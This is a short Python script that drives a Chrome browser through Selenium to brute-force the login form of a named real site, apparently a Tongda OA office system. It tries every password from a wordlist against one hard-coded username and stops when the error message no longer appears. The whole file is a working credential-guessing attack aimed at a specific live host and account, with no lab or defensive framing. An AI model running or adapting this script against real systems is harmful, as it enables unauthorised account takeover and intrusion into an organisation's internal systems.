#! /usr/bin/env python
# encoding:utf8
import time
import sys
try:
    from selenium import webdriver
except:
    print "[x] pip install selenium"
    exit(1)

login_url = "https://oa.tongda2000.com/"
dict_file = "/Pentest/PassList/Passwords/fuckserver.txt"

def login(u, p):
    browser.get(login_url)
    browser.implicitly_wait(10)
    elem = browser.find_element_by_name("UNAME")
    elem.send_keys(u)
    elem = browser.find_element_by_name("PASSWORD")
    elem.send_keys(p)
    elem = browser.find_element_by_id("submit")
    elem.click()
    time.sleep(0.5)

    if u'用户名或密码错误' not in browser.page_source:
        print '\n[+] login success > ' + str(u) + ':' + str(p)
        exit()
    else:
        pass

def main():
    with open(dict_file,'r') as f:
        for p_line in f.readlines():
            for user in ['lijia']:
                sys.stdout.write('\r{0} '.format(p_line.rstrip()))
                login(user,p_line.rstrip())


if __name__ == '__main__':
    browser = webdriver.Chrome()
    main()

